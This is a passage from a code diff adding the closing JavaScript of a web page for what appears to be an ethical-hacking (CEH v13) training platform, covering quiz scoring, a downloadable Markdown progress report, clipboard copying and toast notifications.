+        questionsList.forEach(q => {
+          if (userAnswers[q.id] === q.correctIndex) correctCount++;
+        });
+        const total = questionsList.length;
+        const passed = (correctCount / total) >= 0.7;
+
+        CEHState.quizScores[modId] = { score: correctCount, total, passed };
+        saveState();
+
+        if (passed) {
+          AudioEngine.success();
+          showToast(`Congratulations! Passed Module ${modId} Quiz (${correctCount}/${total})`, 'success');
+        } else {
+          AudioEngine.alert();
+          showToast(`Module ${modId} Quiz: Scored ${correctCount}/${total}. Review the lab and retry.`, 'info');
+        }
+
+        closeQuizModal();
+        renderCurrentView();
+      };
+
+      window.closeQuizModal = () => {
+        const m = document.getElementById('quiz-modal');
+        if (m) m.remove();
+      };
+
+      document.body.appendChild(modal);
+      renderQuizStep();
+    }
+
+    // --- Download Markdown Lab Report ---
+    function downloadMarkdownReport() {
+      AudioEngine.click();
+      const totalLabs = CEHState.labs.length || 21;
+      const completedLabs = Object.values(CEHState.progress).filter(p => p.isCompleted).length;
+      const readinessPct = Math.round((completedLabs / totalLabs) * 100);
+
+      let md = `# Certified Ethical Hacker (CEH v13) Practical Assessment Report\n\n`;
+      md += `**Candidate**: CyberCadet_01\n`;
+      md += `**Date**: ${new Date().toUTCString()}\n`;
+      md += `**Platform**: HackRange CEH v13 Practical Learning Enclave\n`;
+      md += `**Overall Readiness**: ${readinessPct}% (${completedLabs}/${totalLabs} Labs Completed)\n\n`;
+      md += `---\n\n## 1. Laboratory Verification Matrix\n\n`;
+      md += `| Module | Title | Category | Status |\n`;
+      md += `| :--- | :--- | :--- | :--- |\n`;
+      CEHState.labs.forEach(l => {
+        const isDone = (CEHState.progress[l.id] || {}).isCompleted;
+        md += `| M${l.moduleNumber} | ${l.title} | ${l.category} | ${isDone ? 'PASSED' : 'PENDING'} |\n`;
+      });
+      md += `\n---\n\n## 2. Knowledge-Check Assessment Results\n\n`;
+      md += `| Module | Score | Total | Verdict |\n`;
+      md += `| :--- | :--- | :--- | :--- |\n`;
+      Object.entries(CEHState.quizScores).forEach(([modId, qs]) => {
+        md += `| Module ${modId} | ${qs.score} | ${qs.total} | ${qs.passed ? 'PASSED' : 'NEEDS REVIEW'} |\n`;
+      });
+
+      md += `\n---\n\n## 3. Verified CTF Flags\n\n`;
+      md += `| Lab ID | Flag Value | Status |\n`;
+      md += `| :--- | :--- | :--- |\n`;
+      Object.entries(CEHState.flags).forEach(([labId, flagVal]) => {
+        md += `| ${labId} | \`${flagVal}\` | VERIFIED |\n`;
+      });
+
+      md += `\n---\n\n## 4. Technical Findings & Notes\n\n`;
+      Object.entries(CEHState.notes).forEach(([labId, txt]) => {
+        md += `### ${labId} Findings\n\`\`\`text\n${txt}\n\`\`\`\n\n`;
+      });
+
+      const blob = new Blob([md], { type: 'text/markdown;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `CEH_v13_Practical_Report_${new Date().toISOString().slice(0, 10)}.md`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      showToast('Markdown assessment report downloaded!', 'success');
+    }
+
+    // --- Utilities ---
+    function copyCommand(text, e) {
+      if (e) e.stopPropagation();
+      navigator.clipboard.writeText(text).then(() => {
+        AudioEngine.click();
+        showToast('Command copied to clipboard!', 'success');
+      }).catch(() => {
+        showToast('Failed to copy command.', 'error');
+      });
+    }
+
+    function showToast(msg, type = 'info', duration = 3000) {
+      const container = document.getElementById('toast-container');
+      if (!container) return;
+      const toast = document.createElement('div');
+      
+      let border = 'border-charcoal-700 bg-charcoal-900 text-slate-200';
+      if (type === 'success') border = 'border-cyber-emerald/50 bg-charcoal-900 text-emerald-300 glow-emerald';
+      if (type === 'error') border = 'border-rose-500/50 bg-charcoal-900 text-rose-300';
+      if (type === 'info') border = 'border-cyber-cyan/50 bg-charcoal-900 text-cyan-300 glow-cyan';
+
+      toast.className = `p-3 rounded-xl border text-xs font-mono shadow-2xl transition transform pointer-events-auto flex items-center gap-2 max-w-sm ${border}`;
+      toast.innerHTML = `<span>${type === 'success' ? '✔' : type === 'error' ? '✕' : 'ℹ'}</span> <span>${escapeHtml(msg)}</span>`;
+      container.appendChild(toast);
+
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        setTimeout(() => toast.remove(), 300);
+      }, duration);
+    }
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    // Initialize application on load
+    window.addEventListener('DOMContentLoaded', initCEHPlatform);
+  </script>
+
+</body>
+</html>
